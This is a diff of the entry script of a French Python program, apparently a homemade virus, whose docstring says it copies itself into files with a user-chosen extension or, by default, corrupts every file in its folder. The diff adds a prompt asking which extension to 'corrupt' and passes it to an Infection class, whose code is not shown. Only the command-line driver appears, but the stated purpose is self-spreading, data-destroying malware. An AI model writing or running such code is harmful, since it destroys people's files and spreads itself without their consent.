@@ -1,8 +1,10 @@
 """ATTENTION A TESTER DANS UN DOSSIER CONTENANT DES FICHIERS INUTILISES !!!!!
 
-TEST : python3 main.py
-RESULTAT : Corrompt tous les fichiers présents dans le même répertoire que le script
+
 Author : Cardin Patson
+TEST : python3 main.py -infection
+RESULTAT : Se duplique dans les fichiers qui ont l'extension qui a été entré par l'utilisateur
+           Si aucune extension n'est entré, Corrompt tous les fichiers qui se trouve au même emplacement que lui
 """
 
 
@@ -22,8 +24,11 @@ if __name__ == "__main__":
             print("Fichier help Introuvable")
 
     elif sys.argv[1] == "-infection":
-        virus = Infection()
+        extension = input(
+            "Entrez l'extension des fichiers (ex : txt , pptx) à corrompre (par défaut tous les fichiers) : ")
+        virus = Infection(extension)
         virus.infect()
 
     else:
-        raise Exception("Entrez 'python3 main.py -h' pour voir la liste des options disponibles")
+        raise Exception(
+            "Entrez 'python3 main.py -h' pour voir la liste des options disponibles")
